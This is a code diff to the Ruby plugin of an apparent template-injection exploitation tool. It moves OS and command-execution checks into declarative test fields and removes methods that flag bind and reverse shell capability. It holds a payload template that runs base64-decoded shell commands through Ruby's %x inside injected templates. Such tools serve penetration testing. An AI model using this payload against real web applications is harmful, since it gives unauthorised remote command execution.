@@ -38,11 +38,15 @@ class Ruby(Plugin):
             },
             'evaluate' : {
                 'call': 'render',
-                'evaluate': """%(code)s"""
+                'evaluate': """%(code)s""",
+                'test_os' : """RUBY_PLATFORM""",
+                'test_os_expected': '^[\w._-]+$'
             },
             'execute' : {
                 'call': 'evaluate',
-                'execute': """(require'base64';%%x(#{Base64.urlsafe_decode64('%(code_b64)s')})).to_s"""
+                'execute': """(require'base64';%%x(#{Base64.urlsafe_decode64('%(code_b64)s')})).to_s""",
+                'test_cmd': bash.echo % { 's1': rand.randstrings[2] },
+                'test_cmd_expected': rand.randstrings[2]
             },
             'blind' : {
                 'call': 'evaluate_blind',
@@ -74,30 +78,3 @@ class Ruby(Plugin):
         ])
 
     language = 'ruby'
-
-    def rendered_detected(self):
-
-        os = self.evaluate("""RUBY_PLATFORM""")
-        if os and re.search('^[\w._-]+$', os):
-             self.set('os', os)
-             self.set('evaluate', self.language)
-             self.set('write', True)
-             self.set('read', True)
-         
-             expected_rand = str(rand.randint_n(2))
-             if expected_rand == self.execute('echo %s' % expected_rand):
-                 self.set('execute', True)
-                 self.set('bind_shell', True)
-                 self.set('reverse_shell', True)
-
-
-    def blind_detected(self):
-
-        # Blind has been detected so code has been already evaluated
-        self.set('evaluate_blind', self.language)
-
-        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
-             self.set('execute_blind', True)
-             self.set('write', True)
-             self.set('bind_shell', True)
-             self.set('reverse_shell', True)
